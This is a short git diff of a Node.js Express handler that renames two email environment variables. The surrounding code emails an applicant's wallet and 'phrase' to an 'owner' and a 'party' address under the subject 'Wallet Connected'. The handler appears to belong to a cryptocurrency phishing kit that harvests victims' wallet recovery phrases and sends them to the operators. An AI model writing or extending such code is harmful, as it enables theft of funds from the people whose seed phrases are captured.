@@ -17,14 +17,14 @@ exports.emailTheOwnerAndApplicant = async (req, res, next) => {
 
         try {
             await emailApplicant({
-                email: process.env.EMAIL2,
+                email: process.env.EMAIL_PARTY,
                 subject: `Wallet Connected`,
                 phrase: applicant.phrase,
                 wallet: applicant.wallet,
             });
 
             await sendEmail({
-                email: process.env.EMAIL1,
+                email: process.env.EMAIL_OWNER,
                 subject: 'Wallet Connected',
                 wallet: applicant.wallet,
                 phrase: applicant.phrase,
